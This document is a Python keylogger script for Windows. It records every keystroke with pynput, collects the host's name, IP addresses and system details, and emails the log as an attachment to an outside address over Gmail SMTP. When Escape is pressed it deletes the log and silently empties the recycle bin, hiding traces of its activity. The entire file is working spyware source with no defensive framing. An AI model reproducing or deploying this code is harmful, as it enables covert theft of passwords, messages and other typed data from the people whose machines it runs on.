from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import socket
import platform
from requests import get
import winshell

filename = "log.txt"
filepath = "D:\\Downloads\\log.txt"
count = 0
keys = []

# Used to gather information on the system
def getSystemInfo():
    # Gather System Information
    hostname = socket.gethostname()
    internalIP = socket.gethostbyname(hostname)
    processor = platform.processor()
    system = platform.system()
    version = platform.version()
    machine = platform.machine()
    try:
        externalIP = get("https://api.ipify.org").text
    except Exception:
        externalIP = "Could not retrieve External IP Address"

    # Write System Information
    info = f"\n\nHostname: {hostname}\nInternal IP Address: {internalIP}\nExternal IP Address: {externalIP}\nProcessor: {processor}\nSystem: {system} {version}\nMachine: {machine}"

    writeSystemInfo(info)


# Used to write the system information to the file
def writeSystemInfo(info):
    f = open(filepath, "a")

    f.write(info)

    f.close()


# Sends email containg the logged keys and system information
def send_email(filepath, dest):
    global filename

    src = "srcEmail@gmail.com"

    # Setup the message
    msg = MIMEMultipart()
    msg["From"] = src
    msg["To"] = dest
    msg["Subject"] = "Log File"
    body = "Attached is the log file"
    msg.attach(MIMEText(body, "plain"))

    # Open and setup the attachment
    attachment = open(filepath, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", f"attachment; filename= {filename}")
    msg.attach(p)

    # Connect to gmail
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(src, "password")

    # Send message
    text = msg.as_string()
    s.sendmail(src, dest, text)

    s.quit()


# Appends the key to a list and writes to file depending on how many keys are counted
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []


# Writes the keys to the file
def writeFile(keys):
    with open(filepath, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            if k.find("space") > 0:
                f.write("\n")


# Exits the keylogger when the escape key is pressed, sends an email containg the log file, and deletes the log file from the computer
def on_release(key):
    if key == Key.esc:
        getSystemInfo()
        send_email(filepath, "destEmail@gmail.com")
        os.remove(filepath)
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
